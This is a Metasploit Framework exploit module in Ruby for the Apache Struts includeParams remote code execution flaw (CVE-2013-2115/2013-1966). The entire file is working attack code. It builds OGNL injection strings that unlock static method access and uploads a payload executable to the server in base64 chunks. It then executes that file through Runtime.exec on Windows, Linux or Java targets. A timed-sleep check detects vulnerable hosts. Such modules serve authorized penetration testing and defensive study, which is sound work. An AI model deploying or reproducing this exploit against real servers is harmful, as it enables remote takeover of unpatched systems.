##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts includeParams Remote Code Execution',
      'Description'    => %q{
          This module exploits a remote command execution vulnerability in Apache Struts
        versions < 2.3.14.2. A specifically crafted request parameter can be used to inject
        arbitrary OGNL code into the stack bypassing Struts and OGNL library protections.
        When targeting an action which requires interaction through GET the payload should
        be split having into account the uri limits. In this case, if the rendered jsp has
        more than one point of injection, it could result in payload corruption. It should
        happen only when the payload is larger than the uri length.
      },
      'Author'         =>
        [
          # This vulnerability was also discovered by unknown members of:
          #    'Coverity security Research Laboratory'
          #    'NSFOCUS Security Team'
          'Eric Kobrin', # Vulnerability Discovery
          'Douglas Rodrigues', # Vulnerability Discovery
          'Richard Hicks <scriptmonkey.blog[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-2115'],
          [ 'CVE', '2013-1966'],
          [ 'OSVDB', '93645'],
          [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-014'],
          [ 'URL', 'http://struts.apache.org/development/2.x/docs/s2-013.html']
        ],
      'Platform'      => [ 'win', 'linux', 'java'],
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Windows Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            }
          ],
          ['Linux Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            }
          ],
          [ 'Java Universal',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'java'
            },
          ]
        ],
      'DisclosureDate' => 'May 24 2013',
      'DefaultTarget' => 2))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('PARAMETER',[ true, 'The parameter to use for the exploit (does not have to be an expected one).',rand_text_alpha_lower(4)]),
        OptString.new('TARGETURI', [ true, 'The path to a vulnerable struts application action', "/struts2-blank/example/HelloWorld.action"]),
        OptEnum.new('HTTPMETHOD', [ true, 'Which HTTP Method to use, GET or POST','POST', ['GET','POST']]),
        OptInt.new('CHECK_SLEEPTIME', [ true, 'The time, in seconds, to ask the server to sleep while check', 5])
      ], self.class)
  end

  def execute_command(cmd, opts = {})
    inject_string = @inject.gsub(/CMD/,cmd)
    uri = normalize_uri(target_uri.path)
    req_hash = {'uri' => uri, 'version' => '1.1', 'method' => datastore['HTTPMETHOD'] }
    case datastore['HTTPMETHOD']
      when 'POST'
        req_hash.merge!({ 'vars_post' => { datastore['PARAMETER'] => inject_string }})
      when 'GET'
        req_hash.merge!({ 'vars_get' => { datastore['PARAMETER'] => inject_string }})
    end

    # Display a nice "progress bar" instead of message spam
    case @notify_flag
    when 0
      print_status("Performing HTTP #{datastore['HTTPMETHOD']} requests to upload payload")
      @notify_flag = 1
    when 1
      print(".") # Progress dots
    when 2
      print_status("Payload upload complete")
    end

    return send_request_cgi(req_hash) #Used for check function.
  end

  def exploit
    #initialise some base vars
    @inject = "${#_memberAccess[\"allowStaticMethodAccess\"]=true,CMD}"
    @java_upload_part_cmd = "#f=new java.io.FileOutputStream('FILENAME',APPEND),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BUFFER')), #f.close()"
    #Set up generic values.
    @payload_exe = rand_text_alphanumeric(4+rand(4))
    pl_exe = generate_payload_exe
    append = false
    #Now arch specific...
    case target['Platform']
    when 'linux'
      @payload_exe = "/tmp/#{@payload_exe}"
      chmod_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_chmod +x #{@payload_exe}\".split(\"_\"))"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_#{@payload_exe}\".split(\"_\"))"
    when 'java'
      @payload_exe << ".jar"
      pl_exe = payload.encoded_jar.pack
      exec_cmd = ""
      exec_cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,true),"
      exec_cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,false),"
      exec_cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()}),"
      exec_cmd << "#c=#cl.loadClass('metasploit.Payload'),"
      exec_cmd << "#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke("
      exec_cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    when 'windows'
      @payload_exe = "./#{@payload_exe}.exe"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec('#{@payload_exe}')"
    else
      fail_with(Exploit::Failure::NoTarget, 'Unsupported target platform!')
    end

    print_status("Preparing payload...")
    # Now with all the arch specific stuff set, perform the upload.
    # Need to calculate amount to allocate for non-dynamic parts of the URL.
    # Fixed strings are tokens used for substitutions.
    append_length = append ? "true".length : "false".length # Gets around the boolean/string issue
    sub_from_chunk = append_length + ( @java_upload_part_cmd.length - "FILENAME".length - "APPEND".length - "BUFFER".length )
    sub_from_chunk += ( @inject.length - "CMD".length ) + @payload_exe.length + normalize_uri(target_uri.path).length + datastore['PARAMETER'].length
    case datastore['HTTPMETHOD']
      when 'GET'
        chunk_length = 2048 - sub_from_chunk # Using the max request length of 2048 for IIS, subtract all the "static" URL items.
        #This lets us know the length remaining for our base64'd payloads
        chunk_length = ((chunk_length/4).floor)*3
      when 'POST'
        chunk_length = 65535 # Just set this to an arbitrarily large value, as its a post request we don't care about the size of the URL anymore.
    end
    @notify_flag = 0
    while pl_exe.length > chunk_length
      java_upload_part(pl_exe[0,chunk_length],@payload_exe,append)
      pl_exe = pl_exe[chunk_length,pl_exe.length - chunk_length]
      append = true
    end
    java_upload_part(pl_exe,@payload_exe,append)
    execute_command(chmod_cmd) if target['Platform'] == 'linux'
    print_line() # new line character, after progress bar.
    @notify_flag = 2 # upload is complete, next command we're going to execute the uploaded file.
    execute_command(exec_cmd)
    register_files_for_cleanup(@payload_exe)
  end

  def java_upload_part(part, filename, append = false)
    cmd = @java_upload_part_cmd.gsub(/FILENAME/,filename)
    append = append ? "true" : "false" # converted for the string replacement.
    cmd = cmd.gsub!(/APPEND/,append)
    cmd = cmd.gsub!(/BUFFER/,Rex::Text.encode_base64(part))
    execute_command(cmd)
  end

  def check
    #initialise some base vars
    @inject = "${#_memberAccess[\"allowStaticMethodAccess\"]=true,CMD}"
    print_status("Performing Check...")
    sleep_time = datastore['CHECK_SLEEPTIME']
    check_cmd = "@java.lang.Thread@sleep(#{sleep_time * 1000})"
    t1 = Time.now
    print_status("Asking remote server to sleep for #{sleep_time} seconds")
    response = execute_command(check_cmd)
    t2 = Time.now
    delta = t2 - t1


    if response.nil?
      return Exploit::CheckCode::Safe
    elsif delta < sleep_time
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

end
